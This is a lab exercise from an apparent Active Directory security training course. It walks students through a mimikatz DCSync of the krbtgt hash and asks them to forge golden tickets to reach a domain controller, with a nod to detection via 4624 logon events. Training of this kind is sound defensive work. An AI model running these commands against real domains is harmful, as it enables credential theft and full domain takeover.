# Exercise 6 - Persistence

## Tools

You can find all tools needed in the ["attacker-tools.zip"-file](../exercises/attacker-tools). The links below are for your own reference.

Tools needed:

- Mimikatz: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

## Exercise

Since we have domain admin rights now, we can run a DCSync attack. This means that we use the protocol domain controllers use to replicate changes to our advantage and just sync the password hashes we are interested in out of the DC. Awesome!

Open a command prompt with admin rights (right-click "Run as Administrator") and start mimikatz.

```
cd C:\attacker-tools\mimikatz_trunk\x64
.\mimikatz.exe 
```

Sync the password hash of the account "krbtgt".

```
lsadump::dcsync /user:krbtgt
```

As simple as that. Now you own the domain - at least for now.

## Questions

 - Search the internet for guidance on how to create a golden ticket with mimikatz and do so. Make sure to create the golden ticket for the Chuck Norris user and see if you can access the DC with it. Verify your access with the logon events on the DC (EventID 4624). Does a golden ticket login look any different then a normal login when only looking at the 4624-events? `Note:` don't forget to set the correct User ID in the golden ticket using the /id:XXXX parameter
 - Create a second golden ticket for a user that does not exist in the directory. Choose any username you like but use RID 500 like this `/id:500`. Try to access the DC using this ticket once through SMB (dir \\dc-fqdn\C$) and once through Powershell Remoting (Enter-PSSession dc-fqdn). Which of the two works and which one doesn't? 
 - **Bonus Question:** Explain why :-)
